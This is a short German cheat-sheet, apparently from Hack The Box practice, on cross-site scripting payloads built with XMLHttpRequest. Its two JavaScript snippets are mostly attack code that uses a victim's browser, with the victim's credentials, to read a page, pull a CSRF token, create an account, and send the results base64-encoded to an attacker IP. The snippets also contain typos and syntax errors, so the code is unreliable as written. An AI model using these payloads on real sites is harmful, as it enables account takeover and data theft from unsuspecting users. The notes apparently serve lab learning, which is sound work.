# XMLHttpRequest
## XMLHttpRequest um eine Webpage zu erhalten
```js
var target = 'http://ftp.crossfit.htb/accounts/create'
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('GET', http://10.10.14.4/' +btoa(response), true);
req2.send();
```

## XSS benutzt XMLHttpRequest um den VictimsBrowser als Proxy zu nutzen
Ausführlich im [Holiday](https://www.youtube.com/watch?v=FvHyt7KrsPE) Video erklärt oder im [Crossfit](https://www.youtube.com/watch?v=Z3Lj_YN0crc) Video von IppSec.

```js
var target = 'http://ftp.crossfit.htb/accounts/create';
var req1 = new XMLHttpRequest();

req1.open('GET', target, false);
req1.withCredentials = true;
req1.send();

var respnse = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");
var token = doc.getElementsByName('_token')[0].value;

var req2 = new XMLHttpRequest();
var params = "username=fuchs&pass=fuchsbau&_token=" +token;

req2.open('POST', 'ftp.crossfit.htb/accaunts', false);
req2.withCredentials = true;
req2.setRequestHeader('Conent-Type', 'application/x-www-form-urlencoded');
req2.send(params);
var response2 = req2.responseText;

var req3 = new XMLHttpRequest();
req3.open('GET', 'http://10.10.14.4/' # btoa(response2), true);
req3.send();


```